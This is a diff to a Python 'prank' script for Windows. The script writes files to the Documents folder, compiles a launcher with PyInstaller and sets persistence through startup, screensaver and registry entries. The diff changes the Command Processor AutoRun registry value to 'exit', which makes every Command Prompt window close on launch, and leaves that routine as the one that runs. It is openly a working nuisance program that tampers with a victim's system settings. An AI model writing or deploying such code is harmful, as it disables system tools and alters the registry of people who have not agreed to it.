@@ -5,8 +5,6 @@ from pathlib import Path
 
 DOCUMENTS_PATH = os.path.join(os.path.expanduser("~"), "Documents")
 TEXT_FILE_PATH = os.path.join(DOCUMENTS_PATH, "prank.txt")
-EXECUTABLE_PY_PATH = os.path.join(DOCUMENTS_PATH, "quick_cmd.py")
-EXECUTABLE_PATH = os.path.join(DOCUMENTS_PATH, "quick_cmd.exe")
 RUN_PATH = r"notepad.exe " + TEXT_FILE_PATH
 VALUE_NAME = "GetPranked"
 
@@ -20,9 +18,9 @@ def create_quick_cmd():
 import os
 os.system('start cmd /c exit')
 """ # Code within the created file
-    with open(EXECUTABLE_PY_PATH, "w") as file:
+    with open(os.path.join(DOCUMENTS_PATH, "quick_cmd.py"), "w") as file:
         file.write(launcher_code)
-    os.system(f"python -m PyInstaller --onefile \"{EXECUTABLE_PY_PATH}\"") # Turns the created Python file into an executable
+    os.system(f"python -m PyInstaller --onefile \"{os.path.join(DOCUMENTS_PATH, "quick_cmd.py")}\"") # Turns the created Python file into an executable
     # Moves the file to the documents folder
     dist_executable = Path("dist") / "quick_cmd.exe"
     destination = os.path.join(DOCUMENTS_PATH, "quick_cmd.exe")
@@ -58,7 +56,7 @@ def add_to_cmd_start(): # Add AutoRun on command prompt launch
         except FileNotFoundError:
             reg.CreateKey(reg.HKEY_CURRENT_USER, key)
         with reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE) as reg_key:
-            reg.SetValueEx(reg_key, r"AutoRun", 0, reg.REG_SZ, RUN_PATH)
+            reg.SetValueEx(reg_key, r"AutoRun", 0, reg.REG_SZ, "exit")
     except PermissionError:
         print("failed", key)
 
@@ -93,8 +91,8 @@ def add_to_screensaver(): # Attempt to set a file to run when the screensaver ac
 
 if __name__ == "__main__":
     # Fully working
-    create_file()
-    add_to_startup()
+    # create_file()
+    # add_to_startup()
     add_to_cmd_start()
     # Only work with admin
     '''
